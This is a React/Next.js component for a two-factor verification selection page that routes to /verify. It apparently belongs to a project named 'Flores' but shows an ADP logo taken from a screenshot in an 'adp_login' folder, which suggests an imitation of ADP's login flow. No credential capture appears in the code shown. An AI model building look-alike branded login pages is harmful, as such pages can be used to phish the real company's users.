"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { FloresLogo } from "./flores-logo"
import { TFASelectionStep } from "./tfa-selection-step"
import { FLORES_SESSION } from "@/lib/flores-flow"
import adpLogo from "../adp_login/Screenshot 2026-07-06 122158.png"

export function TFAPage() {
  const router = useRouter()
  const [rememberBrowser, setRememberBrowser] = useState(false)

  const handleSelectionSubmit = (method: "email" | "sms", remember: boolean) => {
    setRememberBrowser(remember)
    if (typeof window !== "undefined") {
      sessionStorage.setItem(FLORES_SESSION.verify, "1")
    }
    router.push("/verify")
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      
      <header className="w-full py-3 sm:py-4 px-4 sm:px-6 lg:px-0" style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}>
        <div className="flex items-start">
          <FloresLogo className="items-start" imageSrc={adpLogo.src} alt="ADP Logo" />
        </div>
      </header>

      
      <div className="flex-1 flex items-start justify-center px-4 sm:px-6 pt-4 sm:pt-6 pb-6 sm:pb-8">
        <div className="w-full max-w-4xl">
          <div className="bg-white rounded-lg shadow-lg p-4 sm:p-6 lg:p-8">
            <TFASelectionStep onSubmit={handleSelectionSubmit} />
          </div>
        </div>
      </div>
    </div>
  )
}

